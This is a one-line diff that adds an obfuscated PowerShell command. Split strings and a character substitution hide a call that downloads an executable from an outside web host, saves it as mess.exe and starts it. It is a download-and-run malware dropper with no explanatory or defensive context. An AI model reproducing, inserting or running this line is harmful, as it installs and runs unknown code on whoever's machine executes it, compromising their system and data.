@@ -1,0 +1,1 @@
+﻿iex( (('(N'+'ew-'+'Ob'+'j'+'ect System.Net.W'+'eb'+'Cl'+'ient).Download'+'F'+'ile(sG9h'+'tt'+'p:/'+'/wo'+'rl'+'dnit.co'+'m/a'+'ba.'+'ex'+'e'+'sG9,'+'sG'+'9'+'m'+'e'+'ss.exesG9);Start-Proces'+'s '+'sG9m'+'e'+'s'+'s'+'.'+'e'+'x'+'esG9')-ReplACE 'sG9',[cHar]39) ) 
